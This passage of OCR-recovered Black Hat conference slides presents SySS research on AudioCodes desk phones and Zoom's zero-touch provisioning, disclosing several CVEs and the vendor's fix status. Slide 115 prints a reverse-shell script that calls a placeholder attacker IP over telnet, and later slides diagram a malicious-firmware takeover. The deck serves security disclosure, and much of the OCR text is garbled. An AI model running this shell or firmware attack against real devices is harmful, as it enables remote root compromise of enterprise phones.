#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
00 oO9.A....@9.A....
00 O9.A....9%»»~
00 rootfs.ext4
```

## Slide 112

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
[admin@C450HD /home/ipphone]# cat /etc/release
;release information
[admin]
AUTOMAKE=1
BUILD_OWNER=centos@ip-172-16-142-244.corp.audiocodes.com
BUILD_PROFILE=C450HD
IMG_BLVERSION=4.0.3
SYSDATETIME=121300002021
VCS=ga46 lba3ee0
[default]
BUILD_TIME=2021-12-13 09:07:38
HW_TYPE=C450HD
LOG=0
SWVERSION=UC 3.4.6.604.1
[admin@C450HD /home/ipphone]# ls -la
total 39
-Pwxr-xr-xX
- rwxr-xr-X
- rwxr-Xxr-x
- rwxr-XIr-X
drwxr-xr-x
admin root : udhcpc.script
admin root : udhcpc.script.option43
admin root : udhcpc.vlanid ript
admin root : udhcpc.wlan®. script
admin root
[admin@C450HD /home/ipphone]# ]
drwxr-xr-x 19 admin root
drwxr-xr-x 4 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 4 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 2 admin root
drwxr-xr-x 3 admin root
-rwxr-xr-x 1 admin root : Lighttpd. conf
drwxr-xr-x 2 admin root
drwxr-xr-x 4 admin root
drwxr-xr-x 3 admin root
-rwxr-xr-x 1 admin root : ntpser. List
drwxr-xr-x 2 admin root
drwxr-xr-x 6 admin root
-rw-r--r-- 1 admin root : production.cfg
- PWXIP-XP-X 1 admin root rc. local
-rwxr-xr-X 1 admin root = rcS
drwxr-xr-x 2 admin root ‘ —
UT WXT=XT=x 2 admin root ‘eee
-rw-r--r-- 1 admin root : syss-poc.txt *~ «a
idrwxr-xr-x 2 admin root AR: 5e
-rwxr-xr-xX 1 admin root - tz.lst 3-9
1
1
1
1
5
```

## Slide 113

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
CC audiocodes
CRC Error
A rade Fail
```

## Slide 114

## SYSS-2022-055

- SYSS-2022-055

- CVE-2023-22955

- Missing Immutable Root of Trust in Hardware (CWE-1326)

#BHUSA @BlackHatEvents

## Slide 115

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2&0e253
#!/bin/sh
/bin/sleep 120
TF=$(/bin/mktemp -u)
/usr/bin/mkfifo $TF
/usr/bin/telnet <ATTACKER-IP> 5000 @<$TF | /bin/sh 1>$TF
```

## Slide 116

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2&0e253
SN eee
L$ ne -lvkp 5000
listening on [any] 5000 ...
connect to | | From .t-ipconnect.de [93.229
id
uid=0(admin) gid=0(root) groups=0(root)
cat /etc/release
;release information
[admin]
AUTOMAKE=1
BUILD OWNER=centos@ip-1/72-16-142-244.corp.audiocodes.com
BUILD PROFILE=C45@HD
IMG_BLVERSION=4.0.3
SYSDATETIME=121300002021
VCS=ga461lba3ee0
[default]
BUILD TIME=2021-12-13 09:07:38
Hw TYPE=C456HD
LOG=0
SWVERSION=UC_3.4.6.604.1
U
```

## Slide 117

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ZOOM
1. adds a device and assigns
a configuration template
rx
aa
attacker
```

## Slide 118

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
ZOOM
1. adds a device and assigns
a configuration template
rx
aa
attacker
```

## Slide 119

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vendor redirect service
A
2. initiates that Zoom is
desk phone the provisioning and configuration
— server for the added device
ZOOM
1. adds a device and assigns
a configuration template
rx
aa
attacker
```

## Slide 120

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
—
ZOOM
1. adds a device and assigns
a configuration template
rx
aa
attacker
```

## Slide 121

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
ZOOM
1. adds a device and assigns
a configuration template
rx
aa
attacker
```

## Slide 122

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
ZOOM
1. adds a device and assigns
a configuration template
rx
aa
attacker
```

## Slide 123

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
desk phone
ZOOM
7. downloads and installs
malicious firmware
1. adds a device and assigns
v a configuration template
controls
ano] @---------------- e
fa O} ey
— aaa
attacker
attacker server
```

## Slide 124

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
vendor redirect service
A
2. initiates that Zoom is
the provisioning and configuration
server for the added device
ZOOM
7. downloads and installs
8. reverse shell
initiated malicious firmware
1. adds a device and assigns
v a configuration template
controls
amo) rN
fumao} -------------------- >Re
COE} rp ~
attacker
attacker server
```

## Slide 125

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ADMIN
Assigned Unassigned
Dashboard
>» User Management
Add Import | Export @
>» Device Management
~ Phone System Management | Q
Users & Rooms
Auto Receptionists
Call Queues
Shared Lines
Group Call Pickup
Phone Numbers
Provider Exchange
Phones & Devices
Assets Library
Logs
#BHUSA @BlackHatEvents
```

## Slide 126

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
Import
Batch import unassigned Desk Phones.
Uploading
Fo
Running in the Background
10%
```

## Slide 127

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
USA 2&0e253
=] Desk Phone
=] Desk Phone
=] Desk Phone
=] Desk Phone
| Desk Phone
| Desk Phone
| Desk Phone
| Desk Phone
| Desk Phone
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
AudioCodes c450hd
00-90-8f-9d-b3-04
00-90-8f-9d-b3-05
00-90-8f-9d-b3-06
00-90-8f-9d-b3-09
00-90-8f-9d-b3-08
00-90-8f-9d-b3-Oc
00-90-8f-9d-b3-Ob
00-90-8f-9d-b3-Of
00-90-8f-9d-b3-25
Page 1
of 18
}
Page Size 15 ,
Total 256
```

## Slide 128

## SYSS-2022-056

- SYSS-2022-056

- Unverified Ownership (CWE-283)

#BHUSA @BlackHatEvents

## Slide 129

#BHUSA @BlackHatEvents

## Slide 130

#BHUSA @BlackHatEvents

## Slide 131

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M
fU
O
fU
xt
Ul
am)
A
%
Cg
fe}
```

## Slide 132

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M
fU
O
fU
xt
Ul
am)
A
%
Cg
fe}
```

## Slide 133

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M
fU
O
fU
xt
Ul
am)
A
%
Cg
fe}
```

## Slide 134

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
M
fU
O
fU
xt
Ul
am)
A
%
Cg
fe}
```

## Slide 135

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 20es3
ier
a
Guceen
bot net
```

## Slide 136

## Hard-coded cryptographic Key

SYSS-2022-052 (CVE-2023-22957) & SYSS-2022-054 (CVE-2023-22956):

- State: fixed

- Initial vendor notification: November 2022

#BHUSA @BlackHatEvents

## Slide 137

## Missing immutable Root of Trust

SYSS-2022-055 (CVE-2023-22955):

- State: not fixed

- Initial vendor notification: November 2022

- Vendor response:

- _„AudioCodes 2023 roadmap includes signing of firmware for UC devices.”_

#BHUSA @BlackHatEvents

## Slide 138

### Exposure of sensitive Information to an unauthorized Actor

SYSS-2022-052:

- State: partially fixed

- Initial vendor notification: November 2022

#BHUSA @BlackHatEvents

## Slide 139

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Product Notice #0503
Mutual TLS Authentication (mTLS) Support
for AudioCodes Redirect Service
This Product Notice announces the support of Mutual TLS Authentication (mTLS) for
AudioCodes Redirect Service.
mTLS ensures that both the Redirect server and the device (client) authenticate each other's identities before
establishing a connection. This additional layer of authentication safeguards against unauthorized access,
strengthening the overall security of AudioCodes Redirect Service.
Note: By default, mTLS is disabled, allowing currently deployed devices that may not possess the appropriate
certificates to continue accessing and using the Redirect Service. However, we recommend that Customers enable
mTLS.
#BHUSA @BlackHatEvents
```

## Slide 140

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Note: By default, mTLS is disabled, allowing currently deployed devices that may not possess the appropriate
certificates to continue accessing and using the Redirect Service. However, we recommend that Customers enable
mTLS.
#BHUSA @BlackHatEvents
```

## Slide 141

## Unverified Ownership

SYSS-2022-056:

- State: partially fixed

- Initial vendor notification: November 2022

#BHUSA @BlackHatEvents

## Slide 142

## Recommendations

- Check Redirections

- Limit Network Communications

#BHUSA @BlackHatEvents

## Slide 143

## Conclusion

Phone

Hard-coded cryptographic Key Missing immutable Root of Trust

Vendor
Redirect Server

Exposure of sensitive Information to an unauthorized Actor

Unverified Ownership

#BHUSA @BlackHatEvents

## Slide 144

## Black Hat Sound Bytes

#BHUSA @BlackHatEvents

## Slide 145

## Black Hat Sound Bytes

Insufficient security level of e.g. Desk Phones

#BHUSA @BlackHatEvents

## Slide 146

## Black Hat Sound Bytes

Insufficient security level of e.g. Desk Phones Endpoint Provisioning is a lucrative Target for Attackers

#BHUSA @BlackHatEvents

## Slide 147

## Black Hat Sound Bytes

Insufficient security level of e.g. Desk Phones Endpoint Provisioning is a lucrative Target for Attackers Combine Vulnerabilities FTW!

#BHUSA @BlackHatEvents

## Slide 148

## Thanks!

#### Moritz Abrell

- @moritz_abrell

<u>https://blog.syss.com/posts/zero-touch-pwn/</u>

- SYSS-2022-052 // CVE-2023-22957

- SYSS-2022-053

- SYSS-2022-054 // CVE-2023-22956

- SYSS-2022-055 // CVE-2023-22955

- SYSS-2022-056

#BHUSA @BlackHatEvents
